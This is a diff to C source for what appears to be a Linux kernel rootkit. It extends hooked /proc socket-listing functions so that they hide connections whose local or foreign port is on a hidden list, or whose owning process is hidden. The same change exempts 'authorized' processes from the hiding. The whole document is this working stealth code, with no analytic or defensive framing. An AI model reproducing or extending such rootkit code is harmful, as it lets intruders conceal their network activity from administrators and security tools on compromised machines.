@@ -1,8 +1,11 @@
 #include "net.h"
 
 #include "macro_utils.h"
+#include "utils.h"
+#include <linux/byteorder/generic.h>
 #include <linux/seq_file.h>
 #include <linux/slab.h>
+#include <linux/types.h>
 
 static struct seq_operations *p_tcp4_seq_ops = NULL;
 static struct seq_operations *p_tcp6_seq_ops = NULL;
@@ -16,7 +19,7 @@ static seq_show_t p_orig_udp6_seq_show = NULL;
 
 static LIST_HEAD(hidden_ports_list);
 
-int add_hidden_port(unsigned short ui16_port)
+int add_hidden_port(u16 ui16_port)
 {
     port_list_t *p_hidden_port = NULL;
 
@@ -35,7 +38,7 @@ int add_hidden_port(unsigned short ui16_port)
     return 0;
 }
 
-int del_hidden_port(unsigned short ui16_port)
+int del_hidden_port(u16 ui16_port)
 {
     port_list_t *p_hidden_port = NULL;
     port_list_t *p_tmp         = NULL;
@@ -58,7 +61,7 @@ int del_hidden_port(unsigned short ui16_port)
  * @param ui16_port The port number
  * @return `true` if the port is hidden, `false` otherwise
  */
-static bool is_port_hidden(unsigned short ui16_port)
+static bool is_port_hidden(u16 ui16_port)
 {
     port_list_t *p_hidden_port = NULL;
 
@@ -94,9 +97,18 @@ static void clear_hidden_ports(void)
 
 static int do_seq_show_hooked(const seq_show_t orig_seq_show, seq_file_t *seq, void *v)
 {
-    sock_t *p_sock = NULL; // The socket that is being shown
+    sock_t *p_sock              = NULL; // The socket that is being shown
+    u16 ui16_sport              = 0;    // The local port of the socket (in host byte order)
+    u16 ui16_dport              = 0;    // The foreign port of the socket (in host byte order)
+    pid_t i32_pid               = 0;    // The PID of the process that owns the socket
+    struct fown_struct *p_owner = NULL; // The owner of the socket
 
     pr_dev_info("`%ps()` hooked\n", orig_seq_show);
+
+    IF_U (is_process_authorized(PID_SELF)) {
+        pr_dev_info("* Process is authorized, not hiding...\n");
+        goto ret;
+    }
 
     if (v == SEQ_START_TOKEN) {
         goto ret;
@@ -104,12 +116,37 @@ static int do_seq_show_hooked(const seq_show_t orig_seq_show, seq_file_t *seq, v
 
     p_sock = (sock_t *)v;
 
-    // Check if the socket is hidden
-    pr_dev_info("  * Port: %hu\n", p_sock->sk_num);
+    ui16_sport = le16_to_cpu(p_sock->sk_num);   // Local port: host byte order (little endian)
+    ui16_dport = be16_to_cpu(p_sock->sk_dport); // Foreign port: network byte order (big endian)
 
-    IF_U (is_port_hidden(p_sock->sk_num)) {
-        pr_dev_info("  * Hiding socket\n");
+    // Check if the socket is hidden
+    pr_dev_info("* Src port: %hu\n", ui16_sport);
+    pr_dev_info("* Dst port: %hu\n", ui16_dport);
+    pr_dev_info("* Port pair: %x\n", p_sock->sk_portpair);
+
+    IF_U (is_port_hidden(ui16_sport) || is_port_hidden(ui16_dport)) {
+        pr_dev_info("  * Port is hidden: hiding socket\n");
         return 0;
+    }
+
+    // Check if the process that owns the socket is hidden
+    // Owner process is not usually set, unless F_SETOWN is called, so this will almost never work
+    // Still, it's worth a try
+    // TODO: Find owner of a socket by iterating over all processes
+    IF_L (p_sock->sk_socket != NULL && p_sock->sk_socket->file != NULL) {
+        p_owner = &p_sock->sk_socket->file->f_owner;
+        i32_pid = pid_nr(p_owner->pid);
+        pr_dev_info("* Owner PID: %d\n", i32_pid);
+
+        IF_L (i32_pid != 0) {
+            IF_U (is_pid_hidden(i32_pid)) {
+                pr_dev_info("  * Process is hidden: hiding socket\n");
+                return 0;
+            }
+        }
+    }
+    else {
+        pr_dev_info("* Socket is not owned by a process\n");
     }
 
 ret:
